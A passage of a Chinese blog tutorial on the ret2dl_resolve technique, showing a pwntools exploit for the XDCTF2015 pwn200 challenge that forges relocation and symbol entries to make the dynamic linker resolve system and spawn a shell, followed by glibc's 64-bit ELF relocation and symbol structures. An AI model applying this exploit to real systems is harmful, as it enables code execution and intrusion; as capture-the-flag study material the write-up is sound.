<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>现在我们只差最后一步，即改变我们伪造的 Sym 结构体中的 st_name，使最后索引到的字符串是我们构造的字符串。因为符号表字符串是通过 strtab + sym-&gt;st_name 的方式找到的，所以这部分就很简单了，只需要稍微修改一下 stage2 的exp即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804826c</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - dynsym)/<span class="number">0x10</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_rel = p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">system_addr = base_stage + <span class="number">100</span></span><br><span class="line">st_name = system_addr - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(binsh_addr) <span class="comment">#这里直接改成binsh_addr作为system的参数即可，后面不删否则会改变前面布置的偏移</span></span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line"><span class="comment">#fake_sym</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align</span><br><span class="line">payload += fake_sym</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>我们再执行一下，发现已经得到shell了</p>
<img src="/2022/02/04/ret2_dl_resolve/pwn200-task4.jpg" class>

<h3 id="64位下"><a href="#64位下" class="headerlink" title="64位下"></a>64位下</h3><ul>
<li><p>64位的变化</p>
<ul>
<li><p>glibc 中默认编译使用的是 <code>ELF_Rela</code> 来记录重定位项的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>

<p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p>
</li>
<li><p>Elf64_Sym 结构体为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>

<p>其中Elf64_Word 32 位、Elf64_Section 16 位、Elf64_Addr 64 位、Elf64_Xword 64 位，所以，Elf64_Sym 的大小为 24 个字节。</p>
</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">30</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
